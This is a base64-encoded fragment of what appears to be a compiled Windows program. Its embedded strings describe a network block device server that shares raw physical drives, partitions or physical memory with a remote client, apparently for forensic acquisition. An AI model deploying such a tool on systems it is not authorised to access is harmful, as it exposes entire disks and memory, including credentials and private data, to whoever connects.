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hcnRpdGlvbiBvbiBkaXNrIHRvIHNlcnZlICgwIGlmIG5vdCBzcGVjaWZpZWQpLCAtbiBhbGwgdG8gc2VydmUgYWxsIHBhcnRpdGlvbnMAIC13ICAgICBFbmFibGUgd3JpdGluZyAoZGlzYWJsZWQgYnkgZGVmYXVsdCkAAAAAIC1kICAgICBFbmFibGUgZGVidWcgbWVzc2FnZXMAAAAgLXEgICAgIEJlIFF1aWV0Li5ubyBtZXNzYWdlcwAAACAtaCAgICAgVGhpcyBoZWxwIHRleHQAAFsqXSAAAAAAWytdIAAAAABbLV0gAAAAAENvbm5lY3Rpb24gZHJvcHBlZC4gRXJyb3I6ICVsdQAAb3BlbmluZyBtZW1vcnkAAG9wZW5pbmcgZm9yIHdyaXRpbmcAAAAAAG9wZW5pbmcgcmVhZC1vbmx5AAAAAAAAAEVycm9yIG9wZW5pbmcgZmlsZSAlczogJXUAAAAAAAAAXFwuXFBIWVNJQ0FMRFJJVkUAAAAAAAAAQ2Fubm90IG9idGFpbiBkcml2ZSBsYXlvdXQ6ICV1AABSZXF1ZXN0IG5vIGlvIGJvdW5kYXJ5IGNoZWNrcyBmYWlsZWQuIEVycm9yOiAldQBCb3VuZGFyeSBjaGVja3MgdHVybmVkIG9mZi4AAAAAAERpc2tMZW5ndGg6ICVsbGQAAAAAAAAAAENhbm5vdCBkZXRlcm1pbmUgRGlzayBsZW5ndGguIEVycm9yOiAldQBUYXJnZXRpbmcgb25seSBwYXJ0aXRpb24gJWQAAAAAAFBhcnRpdGlvbiAlZCBpcyBvZiB0eXBlICUwMngAAAAAT2Zmc2V0OiAlbGxkICglbGx4KQAAAAAATGVuZ3RoOiAlbGxkICglbGx4KQBcXC5cAAAAAAAAAABWb2x1bWVMZW5ndGg6ICVsbGQAAAAAAABDYW5ub3QgZGV0ZXJtaW5lIFZvbHVtZSBsZW5ndGguIEVycm9yOiAldQAAAAAAAABGYWlsZWQgdG8gc2V0IGFjcXVpc2l0aW9uIG1vZGUuAEZhaWxlZCB0byBnZXQgbWVtb3J5IGdlb21ldHJ5LgAAQ1IzOiAweCUwMTBsbFggJWQgbWVtb3J5IHJhbmdlczoAAAAAAAAAAFN0YXJ0IDB4JTA4bGxYIC0gTGVuZ3RoIDB4JTA4bGxYAAAAAAAAAABGYWlsZWQgdG8gb2J0YWluIGZpbGVzaXplIGluZm86ICV1AAAAAAAATmVnb3RpYXRpbmcuLi5zZW5kaW5nIE5CRE1BR0lDIGhlYWRlcgAAAE5CRE1BR0lDAAAAAAAAAABGYWlsZWQgdG8gc2VuZCBtYWdpYyBzdHJpbmcAAAAAAEZhaWxlZCB0byBzZW5kIDJuZCBtYWdpYyBzdHJpbmcuAAAAAAAAAABGYWlsZWQgdG8gc2VuZCBmaWxlc2l6ZS4AAAAAAAAAAEZhaWxlZCB0byBzZW5kIGEgY291cGxlIG9mIDB4MDBzAAAAAAAAAABTdGFydGVkIQAAAAAAAAAARmFpbGVkIHRvIHJlYWQgZnJvbSBzb2NrZXQuAHdyaXRlOgAAcmVhZAAAAAAAAAAAUmVxdWVzdDogJXMgRnJvbTogJWxsZCBMZW46ICVsdSAAAAAAAAAAAFVuZXhwZWN0ZWQgcHJvdG9jb2wgdmVyc2lvbiEgKGdvdDogJWx4LCBleHBlY3RlZDogMHgyNTYwOTUxMykAAABJbnZhbGlkIHJlcXVlc3Q6IEZyb206JWxsZCBMZW46JWx1AAAAAAAARmFpbGVkIHRvIHNlbmQgZXJyb3IgcGFja2V0IHRocm91Z2ggc29ja2V0LgAAAAAAVGVybWluYXRpbmcgY29ubmVjdGlvbiBkdWUgdG8gSW52YWxpZCByZXF1ZXN0OiBGcm9tOiVsbGQgTGVuOiVsdQAAAAAAAAAARXJyb3Igc2Vla2luZyBpbiBmaWxlICVzIHRvIHBvc2l0aW9uICVsbGQgKCVsbHgpOiAldQAAAABTZW5kaW5nIGVycm5vPSVkAAAAAAAAAABGYWlsZWQgdG8gc2VuZCBlcnJvciBzdGF0ZSB0aHJvdWdoIHNvY2tldC4AAAAAAAByZWN2IG1heCAlZCBieXRlcwAAAAAAAABXcml0ZUZpbGUgJWQgYnl0ZXMgb2YgJWQgYnl0ZXMgaW4gYnVmZmVyAAAAAAAAAABGYWlsZWQgdG8gd3JpdGUgJWQgYnl0ZXMgdG8gJXM6ICV1AAAAAAAAQmxvY2sgc2l6ZSBpbmNvbnNpc3RlbmN5OiAlZAAAAABDb25uZWN0aW9uIHdhcyBkcm9wcGVkIHdoaWxlIHJlY2VpdmluZyBkYXRhLgAAAABGYWlsZWQgdG8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